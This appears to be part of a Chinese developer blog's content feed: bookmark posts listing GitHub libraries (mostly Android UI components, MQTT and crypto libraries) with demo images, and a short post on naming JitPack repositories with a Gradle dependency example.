<p><img src="http://ww4.sinaimg.cn/mw690/a695acdegw1f3deysrt4gg204s04x17r.gif" alt> <img src="http://ww3.sinaimg.cn/small/a695acdegw1f3deytb648g204s04xwqe.gif" alt> <img src="http://ww3.sinaimg.cn/small/a695acdegw1f3deytpvo0g204s04x450.gif" alt></p>
<h2 id="背景模糊"><a href="#背景模糊" class="headerlink" title="背景模糊"></a>背景模糊</h2><p><a href="https://github.com/charbgr/BlurNavigationDrawer" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/charbgr/BlurActionBarDrawerToggle/master/Screenshot/BlurActionDrawerToggleOpened.png" width="300" height="300" align="center"></p>
<h2 id="pull-to-make-soup"><a href="#pull-to-make-soup" class="headerlink" title="pull-to-make-soup"></a>pull-to-make-soup</h2><p><a href="https://github.com/Yalantis/pull-to-make-soup" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Yalantis/PullToMakeSoup/master/PullToMakeSoupDemo/Resouc
es/recipe-finder.gif" width="300" height="300" align="center"></p>
<h2 id="TextView-的扩展-ExpandableTextView"><a href="#TextView-的扩展-ExpandableTextView" class="headerlink" title="TextView 的扩展 ExpandableTextView"></a>TextView 的扩展 ExpandableTextView</h2><p><a href="https://github.com/Manabu-GT/ExpandableTextView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Manabu-GT/ExpandableTextView/raw/master/art/readme_demo.gif?raw=true" width="300" height="300" align="center"></p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><a href="https://github.com/florent37/ExpansionPanel" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/florent37/ExpansionPanel/master/medias/video1.gif" width="300" height="400" align="center"></p>
<h2 id="列表扩展-ExpandableLayout"><a href="#列表扩展-ExpandableLayout" class="headerlink" title="列表扩展 ExpandableLayout"></a>列表扩展 ExpandableLayout</h2><p><a href="https://github.com/iammert/ExpandableLayout" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/iammert/ExpandableLayout/master/art/ell.png" alt></p>
<h2 id="ScalingLayout"><a href="#ScalingLayout" class="headerlink" title="ScalingLayout"></a>ScalingLayout</h2><p><a href="https://github.com/iammert/ScalingLayout" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/iammert/ScalingLayout/master/art/gif_behavior.gif" alt></p>
<p><img src="https://raw.githubusercontent.com/iammert/ScalingLayout/master/art/gif_fab.gif" alt><br><img src="https://raw.githubusercontent.com/iammert/ScalingLayout/master/art/gif_searchbar.gif" alt></p>
<h2 id="Android开发人员不得不收集的代码"><a href="#Android开发人员不得不收集的代码" class="headerlink" title="Android开发人员不得不收集的代码"></a>Android开发人员不得不收集的代码</h2><p><a href="https://github.com/Blankj/AndroidUtilCode" target="_blank" rel="noopener">Github</a></p>
<h2 id="Luban-鲁班-——可能是最接近微信朋友圈的图片压缩算法"><a href="#Luban-鲁班-——可能是最接近微信朋友圈的图片压缩算法" class="headerlink" title="Luban(鲁班)——可能是最接近微信朋友圈的图片压缩算法"></a>Luban(鲁班)——可能是最接近微信朋友圈的图片压缩算法</h2><p><a href="https://github.com/Curzibn/Luban" target="_blank" rel="noopener">Github</a></p>
<h2 id="Android-资源大全中文版（Android"><a href="#Android-资源大全中文版（Android" class="headerlink" title="Android 资源大全中文版（Android"></a>Android 资源大全中文版（Android</h2><p>资源大全中文版，包括：图表、游戏开发、GUI、崩溃检测、调试工具等，由伯乐在线持续更新。）<br><a href="​https://github.com/jobbole/awesome-android-cn">Github</a></p>
<h2 id="The-MQTT-client-for-Node-js-and-the-browser"><a href="#The-MQTT-client-for-Node-js-and-the-browser" class="headerlink" title="The MQTT client for Node.js and the browser"></a>The MQTT client for Node.js and the browser</h2><p><a href="https://github.com/mqttjs/MQTT.js" target="_blank" rel="noopener">Github</a></p>
<h2 id="MQTT-broker-as-a-module"><a href="#MQTT-broker-as-a-module" class="headerlink" title="MQTT broker as a module"></a>MQTT broker as a module</h2><p><a href="https://github.com/mcollina/mosca" target="_blank" rel="noopener">Github</a></p>
<h2 id="crypto-js为-JavaScript-提供了各种各样的加密算法"><a href="#crypto-js为-JavaScript-提供了各种各样的加密算法" class="headerlink" title="crypto-js为 JavaScript 提供了各种各样的加密算法"></a>crypto-js为 JavaScript 提供了各种各样的加密算法</h2><p><a href="https://github.com/brix/crypto-js" target="_blank" rel="noopener">Github</a><br><a href="https://github.com/brix/crypto-js" target="_blank" rel="noopener">https://github.com/brix/crypto-js</a><br><a href="http://www.oschina.net/p/crypto-js" target="_blank" rel="noopener">http://www.oschina.net/p/crypto-js</a></p>
<h2 id="卡片"><a href="#卡片" class="headerlink" title="卡片"></a>卡片</h2><p><a href="https://github.com/rubensousa/ViewPagerCards" target="_blank" rel="noopener">Github</a><br><img src="https://camo.githubusercontent.com/169da1a6017dc2c13ffd4594cb53536e1c581ce2/68747470733a2f2
f727562656e736f7573612e6769746875622e696f2f696d672f64756f6c696e676f5f7669657770616765722e676966" alt></p>
<h2 id="跑马灯"><a href="#跑马灯" class="headerlink" title="跑马灯"></a>跑马灯</h2><p><a href="https://github.com/sfsheng0322/MarqueeView" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/sfsheng0322/MarqueeView/raw/master/screenshot/MarqueeView.gif" alt></p>
<h2 id="ObservableScrollView"><a href="#ObservableScrollView" class="headerlink" title="ObservableScrollView"></a>ObservableScrollView</h2><p><a href="https://github.com/ksoichiro/Android-ObservableScrollView" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/ksoichiro/Android-ObservableScrollView/master/samples/ima
ges/demo2.gif" alt><br><img src="https://raw.githubusercontent.com/ksoichiro/Android-ObservableScrollView/master/samples/ima
ges/demo12.gif" alt></p>
<h2 id="简化adapter代码的库，可以学习他的源码-base-adapter-helper"><a href="#简化adapter代码的库，可以学习他的源码-base-adapter-helper" class="headerlink" title="简化adapter代码的库，可以学习他的源码 base-adapter-helper"></a>简化adapter代码的库，可以学习他的源码 base-adapter-helper</h2><p><a href="https://github.com/JoanZapata/base-adapter-helper" target="_blank" rel="noopener">Github</a></p>
<h2 id="RecyclerView关键字start最多的一个库"><a href="#RecyclerView关键字start最多的一个库" class="headerlink" title="RecyclerView关键字start最多的一个库"></a>RecyclerView关键字start最多的一个库</h2><p><a href="https://github.com/CymChad/BaseRecyclerViewAdapterHelper/wiki" target="_blank" rel="noopener">Github</a></p>
<h2 id="RecyclerView优秀文集"><a href="#RecyclerView优秀文集" class="headerlink" title="RecyclerView优秀文集"></a>RecyclerView优秀文集</h2><p><a href="https://github.com/CymChad/CymChad.github.io" target="_blank" rel="noopener">Github</a></p>
<h2 id="FlexibleAdapter"><a href="#FlexibleAdapter" class="headerlink" title="FlexibleAdapter"></a>FlexibleAdapter</h2><p><a href="https://github.com/davideas/FlexibleAdapter" target="_blank" rel="noopener">Github</a></p>
<h2 id="SkeletonView-Swift"><a href="#SkeletonView-Swift" class="headerlink" title="SkeletonView(Swift)"></a>SkeletonView(Swift)</h2><p><a href="https://github.com/Juanpe/SkeletonView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Juanpe/SkeletonView/raw/master/Assets/gradient_animated.gif" alt></p>
<h2 id="Skeleton-Android"><a href="#Skeleton-Android" class="headerlink" title="Skeleton(Android)"></a>Skeleton(Android)</h2><p><a href="https://github.com/ethanhua/Skeleton" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/ethanhua/Skeleton/raw/master/screenshots/03.gif" width="300" height="300" align="center"></p>
<h2 id="transitioner"><a href="#transitioner" class="headerlink" title="transitioner"></a>transitioner</h2><p><a href="https://github.com/dev-labs-bg/transitioner" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/dev-labs-bg/transitioner/raw/master/preview1.gif" width="400" height="300" align="center"></p>
<h2 id="Android蓝牙FastBle"><a href="#Android蓝牙FastBle" class="headerlink" title="Android蓝牙FastBle"></a>Android蓝牙FastBle</h2><p><a href="https://github.com/Jasonchenlijian/FastBle" target="_blank" rel="noopener">Github</a><br>这个库虽然开发中不会用，但他的经验可以看看。</p>
<p>…</p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>gitpack仓库命名</title>
    <url>/git/jitpack%E4%BB%93%E5%BA%93%E5%91%BD%E5%90%8D/</url>
    <content><![CDATA[<p>要把库放在Jitpack使用，一般引用是这样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        ...</span><br><span class="line">        maven &#123; url &apos;https://jitpack.io&apos; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">    implementation &apos;com.github.username:libraryname:version&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以最好这样：</p>
<ul>
<li>仓库名称：小写，如：myview，如果名称太长，用中线分割，如：core-ktx</li>
<li>包名：和域名一样com.github.username，如：com.github.kevinvane<br>最后jitpack生成依赖引用是：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation &apos;com.github.kevinvane:myview:version&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这样别人引用你的库，就知道是在com.github.kevinvane包下，名称为myview。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>jitpack</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub资源备忘2019</title>
    <url>/github/GitHub%E8%B5%84%E6%BA%90%E5%A4%87%E5%BF%982019/</url>
    <content><![CDATA[<h2 id="列表加载骨架AndroidVeil"><a href="#列表加载骨架AndroidVeil" class="headerlink" title="列表加载骨架AndroidVeil"></a>列表加载骨架AndroidVeil</h2><p>一个简单，灵活的方式来实现面纱骨架和闪烁的Android效果。<br><a href="https://github.com/skydoves/AndroidVeil" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/skydoves/AndroidVeil/master/art/shimmer01.gif" alt></p>
<h2 id="BounceScrollView"><a href="#BounceScrollView" class="headerlink" title="BounceScrollView"></a>BounceScrollView</h2><p><a href="https://github.com/woxingxiao/BounceScrollView" target="_blank" rel="noopener">Github</a><br>回弹的ScrollView</p>
<h2 id="UltraViewPager"><a href="#UltraViewPager" class="headerlink" title="UltraViewPager"></a>UltraViewPager</h2><p><a href="https://github.com/alibaba/UltraViewPager/blob/master/README-ch.md" target="_blank" rel="noopener">Github</a><br><a href="https://www.oschina.net/p/ultraviewpager?hmsr=aladdin1e1" target="_blank" rel="noopener">oschina</a><br>UltraViewPager是一个封装多种特性的ViewPager，主要是为多页面切换场景提供统一解决方案。</p>
<h2 id="Bouncy-Castle密码术包"><a href="#Bouncy-Castle密码术包" class="headerlink" title="Bouncy Castle密码术包"></a>Bouncy Castle密码术包</h2><p>Bouncy Castle 是一种用于Java平台的开放源码的轻量级密码术包。它支持大量的密码术算法，并提供 JCE 1.2.1 的实现。Bouncy Castle是轻量级的，从J2SE 1.4到J2ME（包括MIDP）平台，它都可以运行。它是在MIDP上运行的唯一完整的密码术包。<br><a href="http://www.bouncycastle.org/" target="_blank" rel="noopener">官网</a></p>
<h2 id="ZIP4J"><a href="#ZIP4J" class="headerlink" title="ZIP4J"></a>ZIP4J</h2><p>ZIP4J 是一个开源的 Java 处理 zip 压缩文件的开发包<br><a href="https://gitee.com/mirrors/zip4j" target="_blank" rel="noopener">Github</a></p>
<h2 id="图片缩放库，用于图片的预览"><a href="#图片缩放库，用于图片的预览" class="headerlink" title="图片缩放库，用于图片的预览"></a>图片缩放库，用于图片的预览</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;com.github.chrisbanes:PhotoView:2.0.0&apos;</span><br><span class="line">&apos;com.davemorrissey.labs:subsampling-scale-image-view:3.10.0&apos;</span><br></pre></td></tr></table></figure>
<h2 id="汉字转拼音"><a href="#汉字转拼音" class="headerlink" title="汉字转拼音"></a>汉字转拼音</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation ‘com.github.stuxuhai:jpinyin:1.0’//拼音</span><br></pre></td></tr></table></figure>
<h2 id="图片文件选择器"><a href="#图片文件选择器" class="headerlink" title="图片文件选择器"></a>图片文件选择器</h2><p>PictureSelector/LuckSiege <a href="https://github.com/LuckSiege/PictureSelector" target="_blank" rel="noopener">Github</a><br>wildma/PictureSelector <a href="https://github.com/wildma/PictureSelector" target="_blank" rel="noopener">Github</a><br>crazycodeboy/TakePhoto <a href="https://github.com/crazycodeboy/TakePhoto" target="_blank" rel="noopener">Github</a></p>
<h2 id="WidgetCase自定义view绘制学习示例"><a href="#WidgetCase自定义view绘制学习示例" class="headerlink" title="WidgetCase自定义view绘制学习示例"></a>WidgetCase自定义view绘制学习示例</h2><p><a href="https://github.com/faith-hb/WidgetCase" target="_blank" rel="noopener">Github</a></p>
<h2 id="音量调整SeekBar"><a href="#音量调整SeekBar" class="headerlink" title="音量调整SeekBar"></a>音量调整SeekBar</h2><p><a href="https://github.com/alpbak/BoxedVerticalSeekBar" target="_blank" rel="noopener">Github</a><br><img src="/images/github/device-2017-10-01-184523.gif" width="280" align="center"></p>
<h2 id="YcShareElement"><a href="#YcShareElement" class="headerlink" title="YcShareElement"></a>YcShareElement</h2><p><a href="https://github.com/yellowcath/YcShareElement/blob/master/README_CN.md" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/yellowcath/YcShareElement/master/readme/se.gif" width="280" align="center"></p>
<h2 id="Dialog-PopWin-等弹框"><a href="#Dialog-PopWin-等弹框" class="headerlink" title="Dialog/PopWin 等弹框"></a>Dialog/PopWin 等弹框</h2><p><a href="https://github.com/li-xiaojun/XPopup" target="_blank" rel="noopener">Github</a></p>
<h2 id="尺子控件"><a href="#尺子控件" class="headerlink" title="尺子控件"></a>尺子控件</h2><p><a href="https://github.com/totond/BooheeRuler" target="_blank" rel="noopener">Github</a></p>
<h2 id="CircularLayoutManager"><a href="#CircularLayoutManager" class="headerlink" title="CircularLayoutManager"></a>CircularLayoutManager</h2><p><a href="https://github.com/leshchenko/CircularLayoutManager" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/leshchenko/CircularLayoutManager/master/animation.gif" width="280" align="center"></p>
<h2 id="MultiProgressBar"><a href="#MultiProgressBar" class="headerlink" title="MultiProgressBar"></a>MultiProgressBar</h2><p><a href="https://github.com/knight-rider1609/MultiProgressBar" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://raw.githubusercontent.com/knight-rider1609/MultiProgressBar/master/versatileprogressbar/src/main/res/drawable/hour_glass.gif" width="280" align="center"></p>
<h2 id="intranet-app-manager"><a href="#intranet-app-manager" class="headerlink" title="intranet_app_manager"></a>intranet_app_manager</h2><p><a href="https://github.com/kevinvane/intranet_app_manager" target="_blank" rel="noopener">Github</a><br>使用 Spring Boot 开发的类似蒲公英和fir的企业内网 APP 分发平台，解决下载限制，实名认证等繁琐过程。</p>
<h2 id="hexo-theme-material"><a href="#hexo-theme-material" class="headerlink" title="hexo-theme-material"></a>hexo-theme-material</h2><p><a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">Github</a><br>An elegant, Pure &amp; Material Design Theme for Hexo.<br>优雅、纯粹、质感的 Hexo 主题。</p>
<h2 id="使用Gatsby-MDX生成GitBook样式的文档-教程网站"><a href="#使用Gatsby-MDX生成GitBook样式的文档-教程网站" class="headerlink" title="使用Gatsby + MDX生成GitBook样式的文档/教程网站"></a>使用Gatsby + MDX生成GitBook样式的文档/教程网站</h2><p><a href="https://github.com/hasura/gatsby-gitbook-starter" target="_blank" rel="noopener">Github</a></p>
<h2 id="Depth-LIB-Android-动画效果库"><a href="#Depth-LIB-Android-动画效果库" class="headerlink" title="Depth-LIB-Android-动画效果库"></a>Depth-LIB-Android-动画效果库</h2><p><a href="https://github.com/danielzeller/Depth-LIB-Android-" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://cdn.dribbble.com/users/655449/screenshots/2179342/menu_dribble.gif" width="280" align="center"></p>
<h2 id="electron-vue"><a href="#electron-vue" class="headerlink" title="electron-vue"></a>electron-vue</h2><p><a href="https://github.com/SimulatedGREG/electron-vue" target="_blank" rel="noopener">Github</a><br><a href="https://simulatedgreg.gitbooks.io/electron-vue/content/cn/" target="_blank" rel="noopener">Docs</a></p>
<p>该项目的目的，是为了要避免使用 vue 手动建立起 electron 应用程序。就是方便用Vue前端构建桌面应用，减少一些配置等工作。</p>
<blockquote>
<p><a href="https://electronjs.org" target="_blank" rel="noopener">electron</a> : 使用 JavaScript, HTML 和 CSS 构建跨平台的桌面应用 ，Electron 基于 Chromium 和 Node.js，由 GitHub 及众多贡献者组成的活跃社区共同维护的开源项目。</p>
</blockquote>
<h2 id="一套开源IM通讯软件-野火IM"><a href="#一套开源IM通讯软件-野火IM" class="headerlink" title="一套开源IM通讯软件-野火IM"></a>一套开源IM通讯软件-野火IM</h2><p><a href="https://github.com/wildfirechat/server" target="_blank" rel="noopener">Github</a><br>这个项目包含App和服务器，可以学习到通讯相关知识，IM通讯基于MQTT，HTTP Web基于Netty，视频通话基于WebRTC。</p>
<h2 id="微信个人号接口机器人"><a href="#微信个人号接口机器人" class="headerlink" title="微信个人号接口机器人"></a>微信个人号接口机器人</h2><p><a href="https://github.com/littlecodersh/ItChat" target="_blank" rel="noopener">Github</a></p>
<h2 id="电商项目"><a href="#电商项目" class="headerlink" title="电商项目"></a>电商项目</h2><p><a href="https://github.com/macrozheng/mall-admin-web" target="_blank" rel="noopener">Github-前端</a><br>后台管理系统前端项目，基于Vue+Element实现。<br><a href="https://github.com/macrozheng/mall" target="_blank" rel="noopener">Github-后端</a><br>前台商城系统及后台管理系统，基于SpringBoot+MyBatis实现</p>
<p><a href="https://github.com/linlinjava/litemall" target="_blank" rel="noopener">Spring Boot后端 + Vue管理员前端 + 微信小程序用户前端 + Vue用户移动端</a></p>
<h2 id="二级联动列表控件"><a href="#二级联动列表控件" class="headerlink" title="二级联动列表控件"></a>二级联动列表控件</h2><p><a href="https://github.com/KunMinX/Linkage-RecyclerView" target="_blank" rel="noopener">Github</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">RxMagic</th>
<th style="text-align:center">Eleme Linear</th>
<th style="text-align:center">Eleme Grid</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><img src="/images/github/二级联动列表控件1.gif" alt="7.gif"></td>
<td style="text-align:center"><img src="/images/github/二级联动列表控件2.gif" alt="2.gif"></td>
<td style="text-align:center"><img src="/images/github/二级联动列表控件3.gif" alt="3.gif"></td>
</tr>
</tbody>
</table>
<h2 id="Vue广告位循环特效"><a href="#Vue广告位循环特效" class="headerlink" title="Vue广告位循环特效"></a>Vue广告位循环特效</h2><p><a href="https://github.com/dreambo8563/vue-piece-slider" target="_blank" rel="noopener">Github</a></p>
<p><a href="https://dreambo8563.github.io/vue-piece-slider/" target="_blank" rel="noopener">demo</a></p>
<h2 id="Android-屏幕共享"><a href="#Android-屏幕共享" class="headerlink" title="Android 屏幕共享"></a>Android 屏幕共享</h2><p><a href="https://github.com/lesa1127/AndroidScreenShare" target="_blank" rel="noopener">Github</a><br>共享原理：主要是使用了Android 5.0 上的MediaProjection 创建虚拟屏幕并采集录制,然后调用系统自带的H264编码器之后封装发送到另一台手机.<br><img src="https://raw.githubusercontent.com/lesa1127/AndroidScreenShare/master/info/1.png" width="280" align="center"></p>
<h2 id="读取apk的信息"><a href="#读取apk的信息" class="headerlink" title="读取apk的信息"></a>读取apk的信息</h2><p><a href="https://github.com/songshuilin/parseApk" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/songshuilin/parseApk/master/parseinfo1.png" width="280" align="center"></p>
<h2 id="AndroidCustomView"><a href="#AndroidCustomView" class="headerlink" title="AndroidCustomView"></a>AndroidCustomView</h2><p><a href="https://github.com/lygttpod/AndroidCustomView" target="_blank" rel="noopener">Github</a><br>带你在实战中学习自定义view，通过几个完整的例子带你走进自定义View的美妙世界 </p>
<h2 id="TCP-proxy-in-ANSI-C"><a href="#TCP-proxy-in-ANSI-C" class="headerlink" title="TCP proxy in ANSI C"></a>TCP proxy in ANSI C</h2><p><a href="https://github.com/kklis/proxy" target="_blank" rel="noopener">Github</a></p>
<p>这是一个简单的TCP代理转发程序，允许您将访问本地主机上指定端口的TCP请求转发到另一台主机上的不同端口。它还可以通过外部命令转发数据(用于记录、过滤或复制网络流量)。它是用ANSI C编写的，所以占用的空间很小，可以用于嵌入式设备。</p>
<blockquote>
<p>注: 大概就是和nginx的反向代理功能差不多，它的优势是小，可以在嵌入式设备上跑。</p>
</blockquote>
<h2 id="JavaScript-经典面向对象Demo-贪吃蛇"><a href="#JavaScript-经典面向对象Demo-贪吃蛇" class="headerlink" title="JavaScript 经典面向对象Demo-贪吃蛇"></a>JavaScript 经典面向对象Demo-贪吃蛇</h2><p><a href="https://github.com/XingJYGo/snakePlay" target="_blank" rel="noopener">Github</a><br> 代码注释详细,逻辑清晰 . 非常适合新手前端开发者, 锻炼JavaScript语言的面向对象的编程思想.<br><img src="https://raw.githubusercontent.com/XingJYGo/snakePlay/master/snake.gif" width="280" align="center"></p>
<h2 id="NineGridView"><a href="#NineGridView" class="headerlink" title="NineGridView"></a>NineGridView</h2><p><a href="https://github.com/jeasonlzy/NineGridView" target="_blank" rel="noopener">Github</a><br>类似QQ空间，微信朋友圈，微博主页等，展示图片的九宫格控件，自动根据图片的数量确定图片大小和控件大小，使用Adapter模式设置图片，对外提供接口回调，支持任意的图片加载框架,如 Glide,ImageLoader,Fresco,xUtils3,Picasso 等，支持点击图片全屏预览大图。<br><img src="https://raw.githubusercontent.com/jeasonlzy/Screenshots/master/NineGridView/demo10.gif" width="280" align="center"></p>
<h2 id="RangeView：用于视频，音频等裁剪范围的View"><a href="#RangeView：用于视频，音频等裁剪范围的View" class="headerlink" title="RangeView：用于视频，音频等裁剪范围的View"></a>RangeView：用于视频，音频等裁剪范围的View</h2><p><a href="https://github.com/iammert/RangeView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/iammert/RangeView/master/art/rangeview.png" width="280" align="center"></p>
<h2 id="仿饿了么购物车效果"><a href="#仿饿了么购物车效果" class="headerlink" title="仿饿了么购物车效果"></a>仿饿了么购物车效果</h2><p><a href="https://github.com/ChyengJason/ShoppingCart" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/ChyengJason/ShoppingCart/raw/master/picture/picture1.png?raw=true" width="280" align="center"><br><a href="https://www.ctolib.com/article/goGitHub/AnimShopButton.html" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/mcxtzhang/AnimShopButton/master/gif/new.gif" width="280" align="center"></p>
<h2 id="CursorWheelLayout：一个Android小部件用于选择轮子上旋转的项目"><a href="#CursorWheelLayout：一个Android小部件用于选择轮子上旋转的项目" class="headerlink" title="CursorWheelLayout：一个Android小部件用于选择轮子上旋转的项目"></a>CursorWheelLayout：一个Android小部件用于选择轮子上旋转的项目</h2><p><a href="https://github.com/BCsl/CursorWheelLayout" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/BCsl/CursorWheelLayout/raw/master/screenshot/gif3.gif" width="280" align="center"></p>
<h2 id="串口SDK"><a href="#串口SDK" class="headerlink" title="串口SDK"></a>串口SDK</h2><p><a href="https://github.com/JamalJo/SerialportAndroid" target="_blank" rel="noopener">Github</a></p>
<h2 id="SpringBoot-MyBatis实现一套电商系统"><a href="#SpringBoot-MyBatis实现一套电商系统" class="headerlink" title="SpringBoot+MyBatis实现一套电商系统"></a>SpringBoot+MyBatis实现一套电商系统</h2><p><a href="https://github.com/macrozheng/mall" target="_blank" rel="noopener">Github</a><br>start 5k</p>
<h2 id="StatusView-一个Android的自定义状态视图"><a href="#StatusView-一个Android的自定义状态视图" class="headerlink" title="StatusView 一个Android的自定义状态视图"></a>StatusView 一个Android的自定义状态视图</h2><p><a href="https://github.com/iammert/StatusView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/iammert/StatusView/master/art/art.gif" width="280" align="center"></p>
<h2 id="时间选择器"><a href="#时间选择器" class="headerlink" title="时间选择器"></a>时间选择器</h2><p><a href="https://github.com/dvird/timerangepicker" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/dvird/timerangepicker/master/example-image/ios12-iphone-x-clock-bedtime-social-card.jpg" width="280" align="center"></p>
<h2 id="音乐搜索music-dl"><a href="#音乐搜索music-dl" class="headerlink" title="音乐搜索music-dl"></a>音乐搜索music-dl</h2><p>从网易云音乐、QQ音乐、酷狗音乐、百度音乐等搜索和下载歌曲<br><a href="https://github.com/0xHJK/music-dl" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/0xHJK/music-dl/master/docs/preview.png" width="280" align="center"></p>
<h2 id="音乐搜索器-多站合一音乐搜索解决方案"><a href="#音乐搜索器-多站合一音乐搜索解决方案" class="headerlink" title="音乐搜索器 - 多站合一音乐搜索解决方案"></a>音乐搜索器 - 多站合一音乐搜索解决方案</h2><p><a href="https://github.com/maicong/music" target="_blank" rel="noopener">Github</a></p>
<h2 id="仿网易云音乐"><a href="#仿网易云音乐" class="headerlink" title="仿网易云音乐"></a>仿网易云音乐</h2><p><a href="https://github.com/PangHaHa12138/MusicPlayer2.0" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/PangHaHa12138/MusicPlayer2.0/master/Screenshot/doc1.png" width="280" align="center"></p>
<h2 id="卷尺"><a href="#卷尺" class="headerlink" title="卷尺"></a>卷尺</h2><p><a href="https://github.com/jdqm/TapeView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/jdqm/TapeView/master/tapeView.gif" width="280" align="center"></p>
<h2 id="WheelView-Android-是一款开源的-Android-滚动选择控件"><a href="#WheelView-Android-是一款开源的-Android-滚动选择控件" class="headerlink" title="WheelView-Android 是一款开源的 Android 滚动选择控件"></a>WheelView-Android 是一款开源的 Android 滚动选择控件</h2><p><a href="https://www.ctolib.com/article/goGitHub/WheelView-Android.html" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/lantouzi/WheelView-Android/master/preview/demo.png" width="280" align="center"></p>
<h2 id="ElasticDragDismissLayou"><a href="#ElasticDragDismissLayou" class="headerlink" title="ElasticDragDismissLayou"></a>ElasticDragDismissLayou</h2><p>拖动关闭视图<br><a href="https://github.com/Commit451/ElasticDragDismissLayout" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/Commit451/ElasticDragDismissLayout/master/art/sample.gif" width="280" align="center"></p>
<h2 id="一个带伸缩位移旋转动画的购物车按钮"><a href="#一个带伸缩位移旋转动画的购物车按钮" class="headerlink" title="一个带伸缩位移旋转动画的购物车按钮"></a>一个带伸缩位移旋转动画的购物车按钮</h2><p><a href="https://github.com/mcxtzhang/AnimShopButton" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/mcxtzhang/AnimShopButton/master/gif/new.gif" width="280" align="center"></p>
<h2 id="银行卡效果"><a href="#银行卡效果" class="headerlink" title="银行卡效果"></a>银行卡效果</h2><p><a href="https://github.com/adonixis/android-submit-credit-card-flow" target="_blank" rel="noopener">Github</a><br><img src="https://cloud.githubusercontent.com/assets/1766863/22521376/afb55130-e8d9-11e6-92e2-e6bcbf2ba6aa.gif" width="280" align="center"></p>
<h2 id="渐变颜色背景"><a href="#渐变颜色背景" class="headerlink" title="渐变颜色背景"></a>渐变颜色背景</h2><p><a href="https://github.com/revely-inc/co.revely.gradient" target="_blank" rel="noopener">Github</a><br><img src="https://gitlab.com/revely/assets/raw/master/revely_gradient/text_gradient.png" width="280" align="center"></p>
<h2 id="Material风格步骤视图StepView"><a href="#Material风格步骤视图StepView" class="headerlink" title="Material风格步骤视图StepView"></a>Material风格步骤视图StepView</h2><p><a href="https://github.com/fython/MaterialStepperView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/fython/MaterialStepperView/master/.readme/vertical.gif" width="280" align="center"></p>
<h2 id="步骤视图StepView"><a href="#步骤视图StepView" class="headerlink" title="步骤视图StepView"></a>步骤视图StepView</h2><p><a href="https://github.com/shuhart/StepView" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/shuhart/StepView/master/images/animation_all.gif" width="280" align="center"></p>
<h2 id="Backboard动画框架"><a href="#Backboard动画框架" class="headerlink" title="Backboard动画框架"></a>Backboard动画框架</h2><p>Android的一个动作驱动的动画框架。<br><a href="https://github.com/tumblr/Backboard" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/tumblr/Backboard/screenshots/screenshots/bloom.gif" width="280" align="center"></p>
<h2 id="AndroidTreeView"><a href="#AndroidTreeView" class="headerlink" title="AndroidTreeView"></a>AndroidTreeView</h2><p>文件夹的树视图<br><a href="https://github.com/bmelnychuk/AndroidTreeView" target="_blank" rel="noopener">Github</a></p>
<h2 id="刮刮乐"><a href="#刮刮乐" class="headerlink" title="刮刮乐"></a>刮刮乐</h2><p><a href="https://github.com/myinnos/AndroidScratchCard" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/myinnos/AndroidScratchCard/master/images-gif/androidscratchcard-example.gif" width="280" align="center"></p>
